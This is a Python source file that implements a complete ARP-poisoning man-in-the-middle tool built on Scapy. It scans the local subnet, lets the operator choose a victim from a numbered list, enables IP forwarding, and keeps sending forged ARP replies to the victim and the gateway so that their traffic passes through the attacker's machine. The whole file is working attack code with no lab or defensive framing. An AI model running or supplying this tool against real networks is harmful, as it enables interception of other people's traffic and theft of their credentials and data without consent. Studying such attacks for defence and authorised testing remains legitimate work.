from scapy.all import ARP, Ether, srp, conf, getmacbyip, sendp, get_if_hwaddr
import os
import ipaddress
import subprocess
import time


def get_ip_range() -> str:
    """
    Queries the native Linux networking stack to determine the active interface
    and calculates the exact local subnet CIDR block.

    Returns:
        str: The IPv4 network range in CIDR notation (e.g., '192.168.1.0/24').

    Raises:
        RuntimeError: If no valid IPv4 address is found on the active interface.
        """
    iface_name = conf.iface.name
    ip_with_cidr_index = 3

    output = subprocess.check_output(
        ["ip", "-o", "-f", "inet", "addr", "show", iface_name],
        text=True
    )

    for line in output.splitlines():
        parts = line.split()
        if len(parts) > ip_with_cidr_index:
            ip_with_cidr = parts[ip_with_cidr_index]
            network = ipaddress.IPv4Network(ip_with_cidr, strict=False)
            return str(network)

    raise RuntimeError(f"[-] No IPv4 address found on interface {iface_name}")


def scan_network(ip_range: str) -> list[dict]:
    """
    Executes a Layer 2 ARP broadcast scan across the specified IP range
    to discover active hosts on the local network.

    Args:
        ip_range (str): The target network block in CIDR notation.

    Returns:
        list[dict]: A list of dictionaries, where each dictionary contains
                    the 'ip' and 'mac' address of an answering host.
    """
    devices_list = []
    timeout = 2
    print(f"[*] Scanning local network for: {ip_range} on interface {conf.iface}...\n")

    arp_request = ARP(pdst=ip_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")

    arp_request_broadcast = broadcast / arp_request
    answered_list, unanswered_list = srp(arp_request_broadcast, timeout=timeout, verbose=False)

    for sent_packet, received_packet in answered_list:
        device_dict = {"ip": received_packet.psrc, "mac": received_packet.hwsrc}
        devices_list.append(device_dict)

    print(f"[i] | {'IP Address':<20} | MAC Address")
    print("-" * 45)
    for current_index, device in enumerate(devices_list):
        print(f'[{current_index}] | {device["ip"]:<20} | {device["mac"]}')

    print(f'[*] Scan completed, please select a target via index.\n')

    return devices_list


def cli_interface(active_list: list[dict]) -> None:
    """
    Provides a command-line interface for the user to safely select a target
    from the list of discovered network devices. Handles input validation.

    Args:
        active_list (list[dict]): The list of discovered hosts from the network scan.
    """
    if not active_list:
        print("[-] No active devices found. Exiting.")
        return
    while True:
        try:
            target_index = int(input("> "))
            if 0 <= target_index < len(active_list):
                break
            else:
                print('[-] Invalid index. Please select a number from the list.')

        except ValueError:
            print('[-] Please enter a valid integer.')

    print(f'[*] target selected, initiating mitm...\n')
    initiate_mitm(active_list, target_index)


def initiate_mitm(active_list: list[dict], index: int) -> None:
    """
    Executes the Man-in-the-Middle ARP poisoning loop. Enables IP forwarding
    and continuously sends forged ARP replies to both the target and the gateway
    to intercept traffic.

    Args:
        active_list (list[dict]): The list of discovered hosts on the network.
        index (int): The index of the target chosen by the user in the CLI.
    """

    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

    arp_reply = 2
    loop_delay = 1  # seconds

    target_ip = (active_list[index])["ip"]
    target_mac = (active_list[index])["mac"]

    interface, local_ip, gateway_ip = conf.route.route("0.0.0.0")
    gateway_mac = getmacbyip(gateway_ip)

    own_mac_address = get_if_hwaddr(conf.iface)
    active_interface = conf.iface.name

    try:
        while True:
            poison_target = Ether(dst=target_mac) / ARP(
                op=arp_reply,
                pdst=target_ip,
                hwdst=target_mac,
                psrc=gateway_ip,
                hwsrc=own_mac_address
            )
            sendp(poison_target, iface=active_interface, verbose=False)

            poison_gateway = Ether(dst=gateway_mac) / ARP(
                op=arp_reply,
                pdst=gateway_ip,
                hwdst=gateway_mac,
                psrc=target_ip,
                hwsrc=own_mac_address
            )
            sendp(poison_gateway, iface=active_interface, verbose=False)

            time.sleep(loop_delay)

    except KeyboardInterrupt:
        print(f'[*] Stopping...')
        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')


if __name__ == "__main__":
    active_network = scan_network(get_ip_range())
    cli_interface(active_network)
